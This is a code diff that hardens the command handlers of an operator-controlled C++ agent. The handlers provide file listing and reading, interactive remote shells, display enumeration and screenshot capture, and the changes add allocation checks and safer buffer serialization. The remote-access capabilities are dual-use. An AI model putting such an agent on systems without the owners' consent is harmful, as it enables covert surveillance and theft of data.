@@ -7,7 +7,8 @@
 #include "math.h"
 #include "logger.h"
 #include "sha2.h"
-#include "vector.h"
+#include "core/containers/vector.h"
+#include "core/binary/binary_writer.h"
 #include "system_info.h"
 #include "shell.h"
 
@@ -73,11 +74,25 @@ static USIZE DecodeWirePath(PCHAR command, USIZE commandLength, WCHAR *widePath,
     return len;
 }
 
-// Writes a simple error response with the given status code
+// Writes a simple error response with the given status code. Always leaves
+// room for the status word; if even this allocation fails, *response stays
+// null and the dispatch loop's null-response guard handles it.
 static VOID WriteErrorResponse(PPCHAR response, PUSIZE responseLength, StatusCode code)
 {
-    *response = new CHAR[*responseLength];
-    *(PUINT32)*response = code;
+    USIZE length = *responseLength;
+    if (length < sizeof(UINT32))
+        length = sizeof(UINT32);
+    PCHAR buffer = new CHAR[length];
+    if (buffer == nullptr)
+    {
+        *response = nullptr;
+        *responseLength = 0;
+        return;
+    }
+    *response = buffer;
+    *responseLength = length;
+    BinaryWriter writer{Span<UINT8>((UINT8 *)buffer, length)};
+    writer.Write<UINT32>((UINT32)code);
 }
 
 // Checks if a directory entry is "." or ".."
@@ -133,9 +148,16 @@ VOID Handle_GetDirectoryContentCommand(PCHAR command, USIZE commandLength, PPCHA
     UINT64 entryCount = (UINT64)entries.Count;
     *responseLength = sizeof(UINT32) + sizeof(UINT64) + (USIZE)(entryCount * sizeof(WireDirectoryEntry));
     *response = new CHAR[*responseLength];
+    if (*response == nullptr)
+    {
+        LOG_ERROR("Failed to allocate the directory content response for %llu entries", entryCount);
+        *responseLength = 0;
+        return;
+    }
 
-    *(PUINT32)*response = StatusCode::StatusSuccess;
-    Memory::Copy(*response + sizeof(UINT32), &entryCount, sizeof(UINT64));
+    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
+    writer.Write<UINT32>(StatusCode::StatusSuccess);
+    writer.Write<UINT64>(entryCount);
 
     WireDirectoryEntry *wireEntries = (WireDirectoryEntry *)(*response + sizeof(UINT32) + sizeof(UINT64));
     for (UINT64 i = 0; i < entryCount; i++)
@@ -173,6 +195,12 @@ VOID Handle_GetFileContentCommand(PCHAR command, USIZE commandLength, PPCHAR res
     File &file = openResult.Value();
     *responseLength = sizeof(UINT32) + sizeof(UINT64) + (USIZE)readCount;
     *response = new CHAR[*responseLength];
+    if (*response == nullptr)
+    {
+        LOG_ERROR("Failed to allocate the file content response for %llu bytes", readCount);
+        *responseLength = 0;
+        return;
+    }
 
     auto setOffsetResult = file.SetOffset((USIZE)offset);
 
@@ -186,8 +214,9 @@ VOID Handle_GetFileContentCommand(PCHAR command, USIZE commandLength, PPCHAR res
 
     UINT32 bytesRead = readResult ? readResult.Value() : 0;
 
-    *(PUINT32)*response = StatusCode::StatusSuccess;
-    *(PUINT64)(*response + sizeof(UINT32)) = bytesRead;
+    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
+    writer.Write<UINT32>(StatusCode::StatusSuccess);
+    writer.Write<UINT64>(bytesRead);
 
     LOG_INFO("File content read successfully for %llu bytes requested, %llu bytes read", readCount, bytesRead);
 }
@@ -221,6 +250,12 @@ VOID Handle_GetFileChunkHashCommand(PCHAR command, USIZE commandLength, PPCHAR r
     // Allocating a buffer for reading file chunks.
     UINT64 bufferSize = Math::Min((UINT64)chunkSize, (UINT64)0xffff);
     PUINT8 buffer = new UINT8[bufferSize];
+    if (buffer == nullptr)
+    {
+        LOG_ERROR("Failed to allocate the chunk read buffer (%llu bytes)", bufferSize);
+        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
+        return;
+    }
 
     SHA256 sha256;
     USIZE totalRead = 0;
@@ -254,8 +289,9 @@ VOID Handle_GetFileChunkHashCommand(PCHAR command, USIZE commandLength, PPCHAR r
     UINT8 digest[SHA256_DIGEST_SIZE];
     sha256.Final(Span<UINT8, SHA256_DIGEST_SIZE>(digest));
 
-    *(PUINT32)*response = StatusCode::StatusSuccess;
-    Memory::Copy(*response + sizeof(UINT32), digest, SHA256_DIGEST_SIZE);
+    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
+    writer.Write<UINT32>(StatusCode::StatusSuccess);
+    writer.WriteBytes(Span<const UINT8>(digest, SHA256_DIGEST_SIZE));
     LOG_INFO("GetFileChunkHash: hashed %llu bytes", (UINT64)totalRead);
 }
 
@@ -278,8 +314,15 @@ VOID Handle_OpenShellCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] US
     LOG_INFO("Shell opened, assigned id %llu", shellId);
     *responseLength = sizeof(UINT32) + sizeof(ShellId);
     *response = new CHAR[*responseLength];
-    *(PUINT32)*response = StatusCode::StatusSuccess;
-    Memory::Copy(*response + sizeof(UINT32), &shellId, sizeof(shellId));
+    if (*response == nullptr)
+    {
+        LOG_ERROR("Failed to allocate the OpenShell response");
+        *responseLength = 0;
+        return;
+    }
+    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
+    writer.Write<UINT32>(StatusCode::StatusSuccess);
+    writer.Write<ShellId>(shellId);
 }
 
 // Writes a command to a shell. Payload: [shellId:8][UTF-8 input + '\0']
@@ -322,7 +365,14 @@ VOID Handle_WriteShellCommand(PCHAR command, USIZE commandLength, PPCHAR respons
 
     // Prepare the response buffer - writing status code
     *response = new CHAR[*responseLength];
-    *(PUINT32)*response = StatusCode::StatusSuccess;
+    if (*response == nullptr)
+    {
+        LOG_ERROR("Failed to allocate the WriteShell response");
+        *responseLength = 0;
+        return;
+    }
+    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
+    writer.Write<UINT32>(StatusCode::StatusSuccess);
 }
 
 // Reads a chunk of data from a shell's stdout. Payload: [shellId:8]
@@ -357,12 +407,22 @@ VOID Handle_ReadShellCommand(PCHAR command, USIZE commandLength, PPCHAR response
         return;
     }
 
-    // Construct the response with status code and the data read from the shell
+    // Construct the response with status code and the data read from the shell.
+    // bytesRead includes the trailing NUL that StringUtils::Copy appends, so the
+    // payload spans the shell output plus its terminator.
     USIZE bytesRead = readResult.Value() + 1;
     *responseLength += bytesRead;
     *response = new CHAR[*responseLength];
-    *(PUINT32)*response = StatusCode::StatusSuccess;
-    StringUtils::Copy(Span<CHAR>(*response + sizeof(UINT32), bytesRead), Span<const CHAR>(buffer, bytesRead));
+    if (*response == nullptr)
+    {
+        LOG_ERROR("Failed to allocate the ReadShell response (%llu bytes)", bytesRead);
+        *responseLength = 0;
+        return;
+    }
+    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
+    writer.Write<UINT32>(StatusCode::StatusSuccess);
+    writer.WriteBytes(Span<const UINT8>((const UINT8 *)buffer, bytesRead - 1));
+    writer.Write<UINT8>('\0');
 }
 
 // Close a shell instance. Payload: [shellId:8]. Idempotent.
@@ -384,7 +444,14 @@ VOID Handle_CloseShellCommand(PCHAR command, USIZE commandLength, PPCHAR respons
 
     *responseLength = sizeof(UINT32);
     *response = new CHAR[*responseLength];
-    *(PUINT32)*response = StatusCode::StatusSuccess;
+    if (*response == nullptr)
+    {
+        LOG_ERROR("Failed to allocate the CloseShell response");
+        *responseLength = 0;
+        return;
+    }
+    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
+    writer.Write<UINT32>(StatusCode::StatusSuccess);
 }
 
 // Exit - gracefully terminate the agent.
@@ -401,9 +468,19 @@ VOID Handle_ExitCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE c
     LOG_INFO("Handling ExitCommand: operator requested agent termination.");
 
     // Acknowledge so the operator knows the exit was received and will be honored.
+    // The exit is honored even if the response allocation fails — the operator
+    // just sees the null-response reconnect instead of an ACK.
     *responseLength = sizeof(UINT32);
     *response = new CHAR[*responseLength];
-    *(PUINT32)*response = StatusCode::StatusSuccess;
+    if (*response == nullptr)
+    {
+        LOG_ERROR("Failed to allocate the Exit response");
+        *responseLength = 0;
+        context->shouldExit = true;
+        return;
+    }
+    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
+    writer.Write<UINT32>(StatusCode::StatusSuccess);
 
     // Signal the main loop to stop after sending this response.
     context->shouldExit = true;
@@ -433,9 +510,16 @@ VOID Handle_GetDisplaysCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] 
     // Prepare the response buffer - writing status code, device count and array of ScreenDevice structures
     *responseLength += sizeof(deviceList.Count) + (USIZE)(deviceList.Count * sizeof(ScreenDevice));
     *response = new CHAR[*responseLength];
-    *(PUINT32)*response = StatusCode::StatusSuccess;
-    Memory::Copy(*response + sizeof(UINT32), &deviceList.Count, sizeof(deviceList.Count));
-    Memory::Copy(*response + sizeof(UINT32) + sizeof(deviceList.Count), deviceList.Devices, (USIZE)(deviceList.Count * sizeof(ScreenDevice)));
+    if (*response == nullptr)
+    {
+        LOG_ERROR("Failed to allocate the GetDisplays response for %u display(s)", deviceList.Count);
+        *responseLength = 0;
+        return;
+    }
+    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
+    writer.Write<UINT32>(StatusCode::StatusSuccess);
+    writer.Write<UINT32>(deviceList.Count);
+    writer.WriteBytes(Span<const UINT8>((const UINT8 *)deviceList.Devices, (USIZE)(deviceList.Count * sizeof(ScreenDevice))));
 
     LOG_INFO("GetDisplays: %u display(s)", deviceList.Count);
 }
@@ -445,17 +529,37 @@ VOID JpegCallback(PVOID context, PVOID data, INT32 size)
 {
     JpegBuffer *jpegBuffer = (JpegBuffer *)context;
 
+    // Once an allocation has failed the encoded stream is truncated; stop
+    // copying. allocationFailed carries the failure to the Encode() caller,
+    // which discards the output instead of shipping a truncated image.
+    if (jpegBuffer->allocationFailed)
+        return;
+
     if (data == nullptr)
         jpegBuffer->Initialize(size);
 
-    if (jpegBuffer->offset + size > jpegBuffer->size)
+    if (jpegBuffer->allocationFailed)
+        return;
+
+    // Grow the reusable JPEG buffer when this chunk no longer fits.
+    // New capacity is max(size * 2, size + needed) so a single large chunk
+    // never triggers repeated doublings. The arithmetic runs in USIZE:
+    // offset/size are UINT32 and their sums could wrap before comparing.
+    if ((USIZE)jpegBuffer->offset + (USIZE)size > jpegBuffer->size)
     {
-        UINT32 newSize = Math::Max(jpegBuffer->size * 2, jpegBuffer->size + size);
+        USIZE newSize = Math::Max((USIZE)jpegBuffer->size * 2, (USIZE)jpegBuffer->size + (USIZE)size);
+        if (newSize > 0xFFFFFFFF)
+            newSize = 0xFFFFFFFF;
         PUINT8 newBuffer = new UINT8[newSize];
+        if (newBuffer == nullptr)
+        {
+            jpegBuffer->allocationFailed = true;
+            return;
+        }
         Memory::Copy(newBuffer, jpegBuffer->outputBuffer, jpegBuffer->offset);
         delete[] jpegBuffer->outputBuffer;
         jpegBuffer->outputBuffer = newBuffer;
-        jpegBuffer->size = newSize;
+        jpegBuffer->size = (UINT32)newSize;
     }
     // Copy the encoded data chunk into the buffer and update the offset
     Memory::Copy(jpegBuffer->outputBuffer + jpegBuffer->offset, data, (USIZE)size);
@@ -512,7 +616,7 @@ VOID Handle_GetScreenshotCommand(PCHAR command, [[maybe_unused]] USIZE commandLe
     {
         graphics.jpegBuffer.Reset();
         auto encodeResult = JpegEncoder::Encode(JpegCallback, &graphics.jpegBuffer, (INT32)quality, (INT32)device.Width, (INT32)device.Height, 3, Span<const UINT8>((UINT8 *)graphics.currentScreenshot, device.Width * device.Height * sizeof(RGB)));
-        if (encodeResult.IsErr())
+        if (encodeResult.IsErr() || graphics.jpegBuffer.allocationFailed)
         {
             LOG_ERROR("Failed to encode the screenshot for display index: %u", displayIndex);
             WriteErrorResponse(response, responseLength, StatusCode::StatusError);
@@ -529,9 +633,16 @@ VOID Handle_GetScreenshotCommand(PCHAR command, [[maybe_unused]] USIZE commandLe
         // Write response
         *responseLength += sizeof(countOfSegments) + sizeof(rect.x) + sizeof(rect.y) + sizeof(rect.sizeOfData) + graphics.jpegBuffer.offset;
         *response = new CHAR[*responseLength];
-        *(PUINT32)*response = StatusCode::StatusSuccess;
-        Memory::Copy(*response + sizeof(UINT32), &countOfSegments, sizeof(UINT32));
-        rect.toBuffer((UINT8 *)*response + sizeof(UINT32) + sizeof(UINT32));
+        if (*response == nullptr)
+        {
+            LOG_ERROR("Failed to allocate the screenshot response (%u bytes of JPEG data)", graphics.jpegBuffer.offset);
+            *responseLength = 0;
+            return;
+        }
+        BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
+        writer.Write<UINT32>(StatusCode::StatusSuccess);
+        writer.Write<UINT32>(countOfSegments);
+        rect.toBuffer(writer.GetAddress() + writer.GetOffset());
         return;
     }
 
@@ -555,11 +666,20 @@ VOID Handle_GetScreenshotCommand(PCHAR command, [[maybe_unused]] USIZE commandLe
     auto &dirtyRects = dirtyResult.Value();
 
     UINT32 countOfRects = 0;
-    USIZE offset = sizeof(UINT32) + sizeof(UINT32);
 
-    // Pre-allocate response buffer with generous initial capacity to avoid per-rect reallocation.
-    USIZE packetCapacity = *responseLength + sizeof(UINT32) + (USIZE)device.Width * device.Height / 2;
-    PCHAR packet = new CHAR[packetCapacity];
+    // Pre-allocate the packet buffer with a generous initial capacity to avoid
+    // per-rect reallocation, then let it double on demand. The first UINT32 is
+    // the status code, the second the rect count; both are written last, once
+    // the final size is known.
+    Buffer<CHAR> packet;
+    if (!packet.Init(*responseLength + sizeof(UINT32) + (USIZE)device.Width * device.Height / 2) ||
+        !packet.Resize(sizeof(UINT32) + sizeof(UINT32)))
+    {
+        dirtyRects.Free();
+        LOG_ERROR("Failed to allocate the screenshot packet for display index: %u", displayIndex);
+        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
+        return;
+    }
 
     for (UINT32 i = 0; i < dirtyRects.Count; i++)
     {
@@ -575,41 +695,41 @@ VOID Handle_GetScreenshotCommand(PCHAR command, [[maybe_unused]] USIZE commandLe
 
         graphics.jpegBuffer.Reset();
         auto encodeResult = JpegEncoder::Encode(JpegCallback, &graphics.jpegBuffer, (INT32)quality, rectWidth, rectHeight, 3, Span<const UINT8>((UINT8 *)graphics.rectBuffer, rectWidth * rectHeight * sizeof(RGB)));
-        if (encodeResult.IsErr())
+        if (encodeResult.IsErr() || graphics.jpegBuffer.allocationFailed)
         {
-            delete[] packet;
             dirtyRects.Free();
             LOG_ERROR("Failed to encode the screenshot for display index: %u", displayIndex);
             WriteErrorResponse(response, responseLength, StatusCode::StatusError);
             return;
         }
 
-        USIZE rectEntrySize = graphics.jpegBuffer.offset + sizeof(UINT32) * 3; // x + y + sizeOfData + jpegData
-        // Grow the packet buffer if needed (double capacity until it fits)
-        if (offset + rectEntrySize > packetCapacity)
+        // Grow the packet to fit this entry (x + y + sizeOfData + jpegData);
+        // the buffer doubles until it fits, preserving what is already written
+        USIZE rectEntrySize = graphics.jpegBuffer.offset + sizeof(UINT32) * 3;
+        if (!packet.Resize(packet.Size + rectEntrySize))
         {
-            USIZE newCapacity = packetCapacity;
-            while (offset + rectEntrySize > newCapacity)
-                newCapacity *= 2;
-            auto newPacket = new CHAR[newCapacity];
-            Memory::Copy(newPacket, packet, offset);
-            delete[] packet;
-            packet = newPacket;
-            packetCapacity = newCapacity;
+            dirtyRects.Free();
+            LOG_ERROR("Failed to grow the screenshot packet for display index: %u", displayIndex);
+            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
+            return;
         }
 
+        // Write the entry into the freshly reserved tail region
         Rectangle rect(dr.X, dr.Y, graphics.jpegBuffer.offset, graphics.jpegBuffer.outputBuffer);
-        offset += rect.toBuffer((UINT8 *)packet + offset);
+        rect.toBuffer((UINT8 *)packet.Data + packet.Size - rectEntrySize);
     }
 
     // Copy the current screenshot to the screenshot buffer for the next comparison
     Memory::Copy(graphics.screenshot, graphics.currentScreenshot, device.Width * device.Height * sizeof(RGB));
 
-    // Construct the response
-    *(PUINT32)(packet + sizeof(UINT32)) = countOfRects;
-    *response = packet;
-    *responseLength = offset;
-    *(PUINT32)*response = StatusCode::StatusSuccess;
+    // Fill in the response header over the finished packet, then hand the exact
+    // accumulated array to the caller (the caller deletes[] *response)
+    BinaryWriter writer{Span<UINT8>((UINT8 *)packet.Data, packet.Size)};
+    writer.Write<UINT32>(StatusCode::StatusSuccess);
+    writer.Write<UINT32>(countOfRects);
+
+    *responseLength = packet.Size;
+    *response = packet.Release();
 
     dirtyRects.Free();
 }
